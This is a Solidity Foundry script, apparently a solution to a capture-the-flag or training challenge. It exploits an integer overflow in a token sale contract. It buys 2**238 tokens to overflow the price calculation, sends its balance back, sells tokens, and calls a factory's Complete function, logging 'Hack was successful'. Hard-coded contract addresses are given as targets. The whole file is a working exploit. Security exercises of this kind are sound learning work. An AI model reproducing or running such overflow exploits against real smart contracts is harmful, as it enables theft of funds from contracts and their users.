// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import {Script, console2} from "forge-std/Script.sol";

interface IFC {
    function register(string memory name) external returns (address);

    function Complete(address token_) external returns (bool);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IVT {
    function isComplete() external view returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract W3BCXIExploitScript is Script {
    IFC public factoryContract =
        IFC(0xCead48ccD40D3f92072ebC6F200492b12456c92A);
    IERC20 public vToken = IERC20(0x4c84EBbcF4f4498345374304e58939544F7e73B9);
    IVT public contractToExploit =
        IVT(0x7d227B4c2b05528Dcf993C0Fd2c631F82ecAC383);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("DO_NOT_LEAK");
        vm.startBroadcast(deployerPrivateKey);

        // address contractAddress = factoryContract.register("Akhuemokhan");
        // console2.log("Contract Address:", contractAddress);
        vToken.approve(msg.sender, 1e18);

        uint256 valueToCauseOverflow = (2**238);

        contractToExploit.buy(valueToCauseOverflow);

        uint256 hackerBal = vToken.balanceOf(msg.sender);

        // We need to send the rest of hacker balance to the contract so that it sums to 2 ethers
        vToken.transfer(address(contractToExploit), hackerBal);
        contractToExploit.sell(2);

        bool isCompleted = factoryContract.Complete(address(contractToExploit));
        console2.log("Hack was successful: ", isCompleted);

        // Stop broadcast
        vm.stopBroadcast();
    }
}